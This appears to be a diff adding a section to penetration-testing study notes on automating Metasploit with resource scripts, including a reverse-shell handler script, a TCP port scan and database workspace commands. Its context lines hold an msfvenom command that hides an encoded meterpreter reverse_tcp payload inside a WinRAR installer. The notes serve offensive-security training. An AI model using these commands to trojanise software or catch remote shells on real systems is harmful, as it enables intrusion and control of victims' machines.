@@ -306,3 +306,134 @@ The `-k` option maintains the functionality of the file we are injecting with a 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
 ```
+
+# Automating
+
+## Automating Metasploit with Resource Scripts
+
+- Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands.
+- They operate similarly to batch scripts, whereby you can specify a set of Msfconsole commands that you want to execute sequentially.
+- You can then load the script with Msfconsole and automate the execution of the commands you specified in the resource script.
+- We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.
+
+## Demo: Automating Metasploit with Resource Scripts
+
+```bash
+ls -al /usr/share/metasploit-framework/scripts/resource/
+```
+
+```bash
+vim /usr/share/metasploit-framework/scripts/resource/auto_brute.rc
+```
+
+We automate setting up a handler:
+
+```bash
+msfconsole
+```
+
+```bash
+vim handler.rc
+```
+
+```bash
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ownIP]
+set LPORT 1234
+run
+:wq
+```
+
+```bash
+ls
+msfconsole -r handler.rc
+```
+
+### portscan.rc
+
+We exit msfconsole:
+
+```bash
+vim portscan.rc
+```
+
+Open a new tab:
+
+We check the name of the module we want to use via `search portscan`. We use the TCP portscan module. Then via `show options` we check what variables we have to set.
+
+Back in the old tab (vim):
+
+```bash
+use auxiliary/scanner/portscan/tcp
+set rhosts [targetIP]
+run
+:wq
+```
+
+```bash
+msfconsole -r portscan.rc
+```
+
+### db_status
+
+```bash
+vim db_status.rc
+```
+
+```bash
+db_status
+workspace
+workspace -a Test
+:wq
+```
+
+```bash
+msfconsole -r db_status.rc
+workspace -d Test
+```
+
+### Loading up resource scripts via msfconsole
+
+```bash
+msf6:resource ~/Desktop/Windows_Payloads/handler.rc
+```
+
+### Create resource script automatically via msfconsole
+
+We type in the commands we want in our resource script and export them into a resource script. The module we want to use is the portscan/tcp module:
+
+```bash
+msf6:use auxiliary/scanner/portscan/tcp
+msf6:set rhosts [targetIP]
+msf6:run
+msf6:makerc ~/Home/kali/Desktop/portscan.rc
+msf6:exit
+```
+
+```bash
+cd ..
+ls
+```
+
+Eventually: We can't see the export because we used MSF as a Root user:
+
+```bash
+su root
+cd /root/Desktop/
+ls
+```
+
+```bash
+cat portscan.rc
+```
+
+
+
+
+
+
+
+    
+
+
